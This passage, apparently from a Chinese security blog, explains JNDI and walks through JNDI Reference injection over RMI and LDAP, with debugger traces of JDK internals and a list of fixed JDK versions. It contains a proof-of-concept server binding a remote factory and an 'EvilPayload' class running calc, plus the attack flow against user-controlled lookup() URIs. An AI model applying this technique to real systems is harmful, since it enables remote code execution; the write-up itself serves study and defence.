<td>域名的部分，其格式是将完整的域名分成几部分，如域名为example.com变成dc&#x3D;example,dc&#x3D;com（一条记录的所属位置）</td>
</tr>
<tr>
<td>uid</td>
<td>User Id</td>
<td>用户ID songtao.xu（一条记录的ID）</td>
</tr>
<tr>
<td>ou</td>
<td>Organization Unit</td>
<td>组织单位，组织单位可以包含其他各种对象（包括其他组织单元），如“oa组”（一条记录的所属组织）</td>
</tr>
<tr>
<td>cn</td>
<td>Common Name</td>
<td>公共名称，如“Thomas Johansson”（一条记录的名称）</td>
</tr>
<tr>
<td>sn</td>
<td>Surname</td>
<td>姓，如“许”</td>
</tr>
<tr>
<td>dn</td>
<td>Distinguished Name</td>
<td>“uid&#x3D;songtao.xu,ou&#x3D;oa组,dc&#x3D;example,dc&#x3D;com”，一条记录的位置（唯一）</td>
</tr>
<tr>
<td>rdn</td>
<td>Relative dn</td>
<td>相对辨别名，类似于文件系统中的相对路径，它是与目录树结构无关的部分，如“uid&#x3D;tom”或“cn&#x3D; Thomas Johansson”</td>
</tr>
</tbody></table>
<h1 id="0x03、JNDI"><a href="#0x03、JNDI" class="headerlink" title="0x03、JNDI"></a>0x03、JNDI</h1><h2 id="一、JNDI描述"><a href="#一、JNDI描述" class="headerlink" title="一、JNDI描述"></a>一、JNDI描述</h2><p>JNDI(Java Naming and Directory Interface)，命名和目录接口。</p>
<p>引用描述：</p>
<blockquote>
<p>JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p>
<p>JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry Service Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作。将RMI服务绑定到JNDI的一个好处是更加透明、统一和松散耦合，RMI客户端直接通过URL来定位一个远程对象，而且该RMI服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。</p>
</blockquote>
<p>功能描述和框架：</p>
<p><img src="/posts/ad3be040/r-139.png" title="JNDI"><br><img src="/posts/ad3be040/r-140.png" title="JNDI"></p>
<p>实现效果就是通过一个字符串来绑定对象如（rmi、ldap、CORBA、dns等等），把这些服务当作容器，通过JNDI封装一下来调用这些容器，充当一个API的作用</p>
<h2 id="二、简单实现"><a href="#二、简单实现" class="headerlink" title="二、简单实现"></a>二、简单实现</h2><h3 id="1、jndi-rmi原生调用"><a href="#1、jndi-rmi原生调用" class="headerlink" title="1、jndi-rmi原生调用"></a>1、jndi-rmi原生调用</h3><p>原生调用方式跟RMI差不多，相当于在RMI上套了一层壳去调用，相关漏洞也跟RMI漏洞一样</p>
<p>JNDI本身不区分客户端和服务端，由于绑定对象在服务端，因此在服务端进行的绑定JNDI，JNDIClient在服务端和客户端均可。<br>JNDIServer:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ad3be040/r-141.png" title="JNDIServer"></p>
<p>JNDIClient:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">        System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ad3be040/r-142.png" title="JNDIClient"></p>
<h3 id="2、References-rmi注入-核心"><a href="#2、References-rmi注入-核心" class="headerlink" title="2、References-rmi注入(核心)"></a>2、References-rmi注入(核心)</h3><p>引用核心部分说明：</p>
<blockquote>
<p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
</blockquote>
<p>以及利用流程：</p>
<ul>
<li>1.目标代码中调用了 InitialContext.lookup(URI)，且 URI 为用户可控；</li>
<li>2.攻击者控制 URI 参数为恶意的 RMI 服务地址，如：rmi:&#x2F;&#x2F;hacker_rmi_server&#x2F;&#x2F;name；</li>
<li>3.攻击者 RMI 服务器向目标返回一个 Reference 对象，Reference 对象中指定某个精心构造的 Factory 类；</li>
<li>4.目标在进行 lookup()操作时，会动态加载并实例化 Factory 类，接着调用 factory.getObjectInstance()获取外部远程对象实例；</li>
<li>5.攻击者可以在 Factory 类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到 RCE 的效果；</li>
</ul>
<p>简述就是可以通过References引用远程用户自定义地址的factory工厂执行恶意代码。</p>
<p>实现:<br>JNDIServer端（通过References绑定远程地址和工厂）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">//        ic.rebind(&quot;rmi://localhost:1099/RMIObject&quot;,new RMIObjectImpl());</span></span><br><span class="line">        Reference rf=<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;EvilPayload&quot;</span>,<span class="string">&quot;http://localhost:8999/&quot;</span>);</span><br><span class="line">        ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,rf);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>恶意远程地址：<br><img src="/posts/ad3be040/r-143.png" title="恶意远程地址"></p>
<p>恶意类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端执行:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">        System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ad3be040/r-144.png" title="客户端执行"></p>
<h3 id="3、References-ldap注入-核心"><a href="#3、References-ldap注入-核心" class="headerlink" title="3、References-ldap注入(核心)"></a>3、References-ldap注入(核心)</h3><p>利用流程很简单：通过客户端lookup查询远程ldap服务恶意类触发漏洞。</p>
<p>恶意地址类:</p>
<p><img src="/posts/ad3be040/r-188.png" title="恶意地址类"></p>
<p>客户端启动ldap服务，将恶意地址类进行绑定：</p>
<p><img src="/posts/ad3be040/r-187.png" title="LDAP服务"></p>
<p>客户端进行查询ldap服务，触发漏洞：</p>
<p><img src="/posts/ad3be040/r-189.png" title="lookup查询"></p>
<h2 id="三、源码分析"><a href="#三、源码分析" class="headerlink" title="三、源码分析"></a>三、源码分析</h2><h3 id="1、jndi-rmi原生调用分析"><a href="#1、jndi-rmi原生调用分析" class="headerlink" title="1、jndi-rmi原生调用分析"></a>1、jndi-rmi原生调用分析</h3><p>这里其实流程不多的，前面提到了该调用方式，顺带学习下流程分析<br>JNDI-RMI服务端:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">    InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>JNDI-RMI客户端调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">        System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在调用<code>lookup</code>处下断点</p>
<p><img src="/posts/ad3be040/r-149.png" title="lookup方法"></p>
<p>跟进<code>InitialContext.lookup</code>方法</p>
<p><img src="/posts/ad3be040/r-150.png" title="lookup方法"></p>
<p>通过<code>getURLOrDefaultInitCtx</code>方法获取字符串上下文，传递的为rmi路径字符串，判断字符串协议，获取到<code>rmiURLContext</code>上下文表（实际是一个<code>hashtable</code>）</p>
<p><img src="/posts/ad3be040/r-151.png" title="rmiURLContext"></p>
<p>返回<code>rmiURLContext</code>上下文表后调用，<code>rmiURLContext.lookup</code>方法，实际调用<code>rmiURLContext</code>父类<code>GenericURLContext</code>的<code>lookup</code>方法，继续跟进<code>GenericURLContext.lookup</code>方法</p>
<p>通过<code>getRootURLContext</code>方法对<code>name</code>字符串进行分割读取</p>
<p><img src="/posts/ad3be040/r-152.png" title="rmiURLContext"></p>
<p>分割完后通过<code>RegistryContext</code>方法获取注册信息</p>
<p><img src="/posts/ad3be040/r-153.png" title="RegistryContext"></p>
<p>通过<code>getRegistry</code>方法获取到<code>RegistryImpl_Stub</code>的注册信息</p>
<p><img src="/posts/ad3be040/r-154.png" title="getRegistry"></p>
<p>调用注册中心获取注册中心<code>stub</code></p>
<p><img src="/posts/ad3be040/r-155.png" title="getRegistry"></p>
<p>获取到过后回到主体，通过<code>ResolveResult</code>方法解析结果</p>
<p><img src="/posts/ad3be040/r-156.png" title="ResolveResult"></p>
<p>实际就是将注册内容赋值给解析结果</p>
<p><img src="/posts/ad3be040/r-157.png" title="ResolveResult"></p>
<p>获取到解析结果<code>res</code>,再调用<code>getResolvedObj</code>方法获取到解析结果对象（也就是<code>RegistryContext</code>）</p>
<p><img src="/posts/ad3be040/r-158.png" title="res"></p>
<p>再调用<code>RegistryContext.lookup</code>方法</p>
<p><img src="/posts/ad3be040/r-159.png" title="RegistryContext.lookup"></p>
<p>这里就是调用原生rmi的步骤了</p>
<p><img src="/posts/ad3be040/r-160.png" title="RegistryImpl_stub"></p>
<p>调用<code>RegistryImpl_stub.lookup</code>方法，流程跟上面分析过的<code>rmi</code>的步骤一样通过<code>lookup</code>向注册中心查询远程对象，就不再分析了</p>
<p><img src="/posts/ad3be040/r-161.png" title="RegistryImpl_stub"></p>
<p>返回了一个远程服务器的动态代理对象<code>stub</code></p>
<p><img src="/posts/ad3be040/r-163.png" title="stub"></p>
<p>然后调用<code>decodeObject</code>方法</p>
<p><img src="/posts/ad3be040/r-164.png" title="decodeObject"></p>
<p><code>decodeObject</code>方法最先判断该远程对象（<code>RemoteObjectlnvocationHandler</code>）是否属于<code>RemoteReference</code>远程引用类，由于不属于就将该对象转化为<code>Object</code>对象</p>
<p><img src="/posts/ad3be040/r-165.png" title="decodeObject"></p>
<p>然后调用<code>NamingManager.getObjectInstance</code>方法，继续跟进，这里用注释解释一些步骤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">      <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                        Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">      <span class="keyword">throws</span> Exception</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">      ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//使用工厂，若工厂变量存在被赋值，就用赋值的工厂去构建对象，默认为null</span></span><br><span class="line">      <span class="comment">// Use builder if installed</span></span><br><span class="line">      <span class="type">ObjectFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> getObjectFactoryBuilder();</span><br><span class="line">      <span class="keyword">if</span> (builder != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="comment">// builder must return non-null factory</span></span><br><span class="line">          factory = builder.createObjectFactory(refInfo, environment);</span><br><span class="line">          <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,</span><br><span class="line">              environment);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//判断对象是否实现Reference或者Referenceable</span></span><br><span class="line">      <span class="comment">// Use reference if possible</span></span><br><span class="line">      <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">          ref = (Reference) refInfo;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">          ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      Object answer;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//工厂存在、并且对象是Reference类，工厂类名能获取到，就对该对象进行工厂构建实例化对象</span></span><br><span class="line">      <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">          <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">              <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">              factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">              <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                   environment);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">              <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">              <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">              <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">              <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">              answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">              <span class="keyword">if</span> (answer != <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> answer;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//上面的情况都不存在，没有工厂，对象也不是Reference类，就搜寻其它符合条件的的工厂，存在就返回工厂，否则返回null</span></span><br><span class="line">      <span class="comment">// try using any specified factories</span></span><br><span class="line">      answer =</span><br><span class="line">          createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">      <span class="keyword">return</span> (answer != <span class="literal">null</span>) ? answer : refInfo;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在该方法中，由于构建器未创建因此<code>builder</code>为<code>null</code>，同时该动态代理<code>stub</code>不属于<code>Reference/Referenceable</code>，因此找不到对应的工厂无法进行创建对象实例化，最后调用<code>createObjectFromFactories</code>方法寻找符合条件的工厂，不存在符合条件的工厂，因此返回<code>null</code>，到此结束创建过程，最后只获得<code>rmi</code>的远程服务<code>stub</code>进行通讯</p>
<p><img src="/posts/ad3be040/r-166.png" title="NamingManager.getObjectInstance"></p>
<p>总结描述就是：JNDI通过上下文对rmi字符串进行解析，识别到rmi协议，判断是否是远程引用（References类），不是的话再由rmi调用方式去执行代码。</p>
<h3 id="2、References-rmi注入调试分析"><a href="#2、References-rmi注入调试分析" class="headerlink" title="2、References-rmi注入调试分析"></a>2、References-rmi注入调试分析</h3><p>JNDI-rmi服务端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">//        ic.rebind(&quot;rmi://localhost:1099/RMIObject&quot;,new RMIObjectImpl());</span></span><br><span class="line">        Reference rf=<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;2EvilPayload&quot;</span>,<span class="string">&quot;EvilPayload&quot;</span>,<span class="string">&quot;http://localhost:8999/&quot;</span>);</span><br><span class="line">        ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,rf);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>JNDI-rmi客户端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">    InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">    System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>1）环境准备</strong><br>当前测试环境为jdk1.8.0_66(漏洞在jdk8_121处进行防护措施),在调试前需要添加sun包，idea导入默认的jdk1.8.0_66版本没有sun.jndi的包，调试中会遇到jndi包会进入class文件，不利于调试，因此需要手动导入sun.jndi包</p>
<p>源码下载：<a target="_blank" rel="noopener" href="https://hg.openjdk.java.net/jdk8/jdk8/jdk/">https://hg.openjdk.java.net/jdk8/jdk8/jdk/</a></p>
<p><img src="/posts/ad3be040/r-145.png" title="sun源码下载"></p>
<p>下载过后，将对应sun.jndi包导入jdk根目录src.zip中，然后重新加载一下即可</p>
<p><img src="/posts/ad3be040/r-146.png" title="sun源码导入"><br><img src="/posts/ad3be040/r-147.png" title="sun源码导入"></p>
<p>接下来就能对当前java版本进行调试了</p>
<p><img src="/posts/ad3be040/r-148.png" title="调试"></p>
<p><strong>2）分析调试</strong><br>前半段部分跟原生rmi分析一样，不重复分析，进入到不同的代码逻辑中分析，直到<code>RegistryContext.lookup</code>方法这里获取obj对象。</p>
<p><img src="/posts/ad3be040/r-168.png" title="DecodeObject"></p>
<p>通过<code>RegistryImpl_Stub.lookup</code>查询对象，本身返回的是远程对象的<code>stub</code>如上面分析那样获取远程对象的动态代理<code>stub</code>，但这里返回<code>ReferenceWrapper_Stub</code></p>
<p><img src="/posts/ad3be040/r-169.png" title="RegistryImpl_Stub.lookup"></p>
<p>导致返回<code>ReferenceWrapper_Stub</code>的原因在服务端进行<code>rebind</code>的时候进行的<code>encodeObject</code></p>
<p><img src="/posts/ad3be040/r-170.png" title="rebind"></p>
<p>跟进绑定，这里直接截取关键步骤到<code>RegistryContext.rebind</code>方法，这里在对对象绑定时，多了一个<code>encodeObject</code>步骤</p>
<p><img src="/posts/ad3be040/r-171.png" title="rebind"></p>
<p>这里针对<code>obj</code>对象属于<code>Reference</code>类的话，就强制转换成<code>ReferenceWrapper</code>对象，因此实际绑定的是<code>ReferenceWrapper_stub</code>对象，在上面远程获取对象<code>stub</code>的时候会获取到<code>ReferenceWrapper_stub</code></p>
<p><img src="/posts/ad3be040/r-172.png" title="lookup"></p>
<p>回到客户端主体上来，获取到<code>ReferenceWrapper_stub</code>对象过后，运行<code>decodeObject</code>方法</p>
<p><img src="/posts/ad3be040/r-173.png" title="encodeObject"></p>
<p>跟进<code>decodeObject</code>方法，此时判断远程对象属于是<code>RemoteReference</code>类，因此调用<code>getReference()</code>方法返回引用对象</p>
<p><img src="/posts/ad3be040/r-167.png" title="DecodeObject"></p>
<p>然后调用<code>NamingManager.getObjectInstance</code>方法，继续跟进</p>
<p><img src="/posts/ad3be040/r-174.png" title="NamingManager.getObjectInstance"></p>
<p>这里同样显示查看是否存在构造器，由于未创建，因此<code>builder</code>为<code>null</code>，再判断远程对象是否属于引用类（<code>Reference</code>），属于，然后将引用对象信息赋值给<code>ref</code>变量</p>
<p><img src="/posts/ad3be040/r-175.png" title="NamingManager.getObjectInstance"></p>
<p>接着<code>ref</code>已经被赋值，因此进入判断体，变量<code>f</code>为获取远程对象的工厂类名，<code>ref</code>存在、<code>f</code>存在，通过<code>getObjectFactoryFromReference</code>方法从引用中获取对象工厂，跟进<code>getObjectFactoryFromReference</code>方法</p>
<p><img src="/posts/ad3be040/r-176.png" title="getObjectFactoryFromReference"></p>
<p><code>getObjectFactoryFromReference</code>方法通过类加载直接加载工厂名</p>
<p><img src="/posts/ad3be040/r-177.png" title="loadClass"></p>
<p>通过本地类加载器去加载工厂类</p>
<p><img src="/posts/ad3be040/r-178.png" title="loadClass"></p>
<p>由于是远程地址的工厂，本地加载器查询不到的远程的工厂，因此<code>cla</code>为<code>null</code></p>
<p><img src="/posts/ad3be040/r-179.png" title="loadClass"></p>
<p>接着调用<code>ref.getFactoryClassLocation()</code>查看工厂类地址，返回远程地址</p>
<p><img src="/posts/ad3be040/r-180.png" title="getFactoryClassLocation()"></p>
<p>然后再调用类加载去加载<code>codebase</code>远程地址</p>
<p><img src="/posts/ad3be040/r-181.png" title="getFactoryClassLocation()"></p>
<p>这里通过调用<code>URLClassLoader</code>类加载器去创建出<code>FactoryURLClassLoader</code>工厂<code>URL</code>类加载器，然后通过这个工厂<code>URL</code>类加载器去远程加载恶意工厂</p>
<p><img src="/posts/ad3be040/r-182.png" title="FactoryURLClassLoader"></p>
<p><img src="/posts/ad3be040/r-185.png" title="远程地址"></p>
<p>获取到加载器后，就调用加载器实例化<code>newInstance()</code>，此时恶意工厂的构造函数被执行，触发漏洞</p>
<p><img src="/posts/ad3be040/r-183.png" title="newInstance()"></p>
<p><img src="/posts/ad3be040/r-184.png" title="漏洞触发"></p>
<p><strong>调用链</strong><br>由上面分析步骤得到JNDI-rmi的Reference注入调用链：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RegistryContext.DecodeObject()</span><br><span class="line">    -&gt;NamingManager.getObjectInstance()</span><br><span class="line">        -&gt;factory.getObjectInstance()</span><br></pre></td></tr></table></figure>

<p><strong>3）疑惑</strong><br>在运行一次引用注入过后，每一步调试不再去请求远程地址，通过本地的类加载器也能加载工厂进行实例化。</p>
<p>原因：在构造过后本地项目out目录下生成了远程工厂的类，因此在下次执行的时候在本地类加载的时候就能获取到该类信息。（具体在哪个步骤导致的没发现，本地文件删除过后，后面就没写入了）</p>
<h3 id="3、References-ldap注入调试分析"><a href="#3、References-ldap注入调试分析" class="headerlink" title="3、References-ldap注入调试分析"></a>3、References-ldap注入调试分析</h3><p>lookup下断点分析</p>
<p><img src="/posts/ad3be040/r-191.png" title="lookup"></p>
<p>同样的步骤通过<code>getURLOrDefaultInitCtx</code>方法获取字符串上下文，判断协议前缀调用对象类的上下文，前面分析过了，这里直接过掉</p>
<p><img src="/posts/ad3be040/r-192.png" title="getURLOrDefaultInitCtx"></p>
<p>通过协议前缀获取到<code>ldapURLContext</code>上下文，进入它的<code>lookup</code>方法</p>
<p><img src="/posts/ad3be040/r-193.png" title="ldapURLContext"></p>
<p>通过<code>hasQueryComponents</code>方法查询字符串结尾是否存在?号（如ldap:&#x2F;&#x2F;localhost:9999&#x2F;?），存在就抛出异常，接着跟进<code>super.lookup</code>方法，也就是父类的<code>lookup</code>方法</p>
<p>同样调用<code>getRootURLContext</code>方法分割解析路径获取解析结果，在调用<code>getResolvedObj</code>方法获取解析结果对象<code>LdapCtx</code></p>
<p><img src="/posts/ad3be040/r-194.png" title="GenericURLContext.lookup"></p>
<p>跟进<code>ctx.lookup</code></p>
<p><img src="/posts/ad3be040/r-194.png" title="ctx.lookup"></p>
<p>获取一些相关属性过后，调用<code>LdapCtx.lookup</code>方法（调用到父类<code>ComponentDirContext</code>的<code>.lookup</code>方法），继续跟进</p>
<p><img src="/posts/ad3be040/r-195.png" title="ComponentDirContext.lookup"></p>
<p>通过<code>p_resolveIntermediate</code>方法解析运行介质，进入<code>TERMINAL_COMPONENT</code>终端组件分支（我是这么理解的），然后调用<code>c_lookup</code>方法，跟进</p>
<p><img src="/posts/ad3be040/r-196.png" title="LdapCtx.c_lookup"></p>
<p>获取到远程<code>ldap</code>的<code>entry</code>后赋值给<code>attr</code>保存，开始解码对象信息</p>
<p><img src="/posts/ad3be040/r-197.png" title="decodeObject"></p>
<p>先是获取到<code>codebase</code>也就是<code>ldap</code>服务地址，然后判断字段属性，根据不同属性进行不同的解析（如果是序列化对象就用反序列化解析对象，如果是远程对象，就用rmi解析对象），</p>
<p><img src="/posts/ad3be040/r-198.png" title="JAVA_ATTRIBUTES"></p>
<p>这里是引用对象，因此会走到引用对象判断里，调用<code>decodeReference</code>方法</p>
<p><img src="/posts/ad3be040/r-199.png" title="引用对象"></p>
<p>跟进<code>decodeReference</code>方法，获取类名、工厂，然后创建引用对象信息<code>ref</code></p>
<p><img src="/posts/ad3be040/r-200.png" title="引用对象ref"></p>
<p>获取到<code>ref</code>引用对象<code>Obj</code>后，调用<code>DirectoryManager.getObjectInstance</code>静态方法，跟进</p>
<p><img src="/posts/ad3be040/r-201.png" title="DirectoryManager.getObjectInstance"><br><img src="/posts/ad3be040/r-202.png" title="DirectoryManager.getObjectInstance"></p>
<p>可以看到这里的方法跟上面<code>jndi-rmi</code>最后调用实例化的方法<code>NamingManager.getObjectInstance</code>非常相似，相关判断描述在<code>jndi-rmi</code>分析过了就接着下面</p>
<p>获取到工厂对象信息、工厂类名后，然后通过<code>getObjectFactoryFromReference</code>构建工厂</p>
<p><img src="/posts/ad3be040/r-203.png" title="getObjectFactoryFromReference"></p>
<p>跟进，类加载工厂类名</p>
<p><img src="/posts/ad3be040/r-204.png" title="loadClass"></p>
<p>同样本地不存在该工厂类（该类为ldap远程的恶意类，本地加载器在本地搜索不到该类），传入<code>codebase</code>进行类加载，继续跟进</p>
<p><img src="/posts/ad3be040/r-205.png" title="loadClass"></p>
<p>同样的步骤通过<code>URLClassLoader</code> URL加载器远程加载对象类</p>
<p><img src="/posts/ad3be040/r-206.png" title="URLClassLoader.newInstance"></p>
<p>获取URLClassLoader类加载器后，再次进行类加载</p>
<p><img src="/posts/ad3be040/r-207.png" title="loadClass"></p>
<p>此时通过反射成功获取到远程类对象。</p>
<p><img src="/posts/ad3be040/r-208.png" title="loadClass"></p>
<p>然后返回类对象，最后对类对象进行实例化，触发漏洞，最后的步骤跟jndi调用rmi时步骤一样</p>
<p><img src="/posts/ad3be040/r-209.png" title="newInstance"><br><img src="/posts/ad3be040/r-210.png" title="触发漏洞"></p>
<h1 id="0x04、修复范围"><a href="#0x04、修复范围" class="headerlink" title="0x04、修复范围"></a>0x04、修复范围</h1><p>JNDI-RMI:<br><font color="red">JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121</font>开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。<br><font color="red">JDK 6u132, JDK 7u122, JDK 8u113</font>开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了false。</p>
<p>JNDI-LDAP:<br>2018年10月，Java修复了该利用点，对LDAP Reference远程工厂类的加载增加了限制<br>范围：<font color="red">Oracle JDK 11.0.1、8u191、7u201、6u211</font>之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，需要人工调整至true</p>
<p>引用网上的一张修复时间轴:</p>
<p><img src="/posts/ad3be040/r-190.png" title="漏洞修复时间轴"></p>
